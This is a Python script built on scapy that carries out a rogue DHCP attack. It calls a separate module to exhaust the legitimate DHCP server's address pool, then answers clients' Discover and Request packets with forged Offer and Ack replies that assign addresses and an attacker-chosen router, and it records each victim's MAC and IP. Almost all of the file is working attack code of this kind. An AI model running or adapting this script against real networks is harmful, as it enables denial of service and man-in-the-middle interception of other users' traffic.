#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP
import dhcp_exhaust
import ipaddress
import settings

# EXHAUST IP POOL OF REAL DHCP
dhcp_exhaust.exhaust()

ip = ipaddress.ip_address(settings.start_ip)
database = []

def process(p):
    global ip
    global database
    if p.haslayer('DHCP'):
        chaddr = p["BOOTP"].chaddr
        xid = p["BOOTP"].xid
        if p["DHCP"].options[0][1] == 1:
            ip += 1
            print("Discover received")
            dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src=settings.source_ip, dst='255.255.255.255') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'offer'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
                        ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
            sendp(dhcp_offer, iface=settings.source_interface, verbose=0)
            print( " -> Offer sent")
        elif p["DHCP"].options[0][1] == 3:
            print("Request received")
            dhcp_ack = Ether(dst="ff:ff:ff:ff:ff:ff") \
                        / IP(src=settings.source_ip, dst=str(ip)) \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
                        / DHCP(options=[('message-type', 'ack'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
                        ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
            sendp(dhcp_ack, iface=settings.source_interface, verbose=0)
            database.append((p["Ether"].src,str(ip)))
            database = list(set(database)) # removing duplicates :)
            print( " -> Ack sent")


# DHCP SERVEUR SIMULATION
print()
print("SNIFFING")
try:
    offer = sniff(filter="src host 0.0.0.0 and port 68 and port 67", iface=settings.source_interface, prn=process)
except KeyboardInterrupt:
    print("Database")
    print(database)
    exit()
finally:
    print("-------Database------")
    for mac, ip in database:
        print(mac + " -> " + ip)
    print("---------------------")
    exit()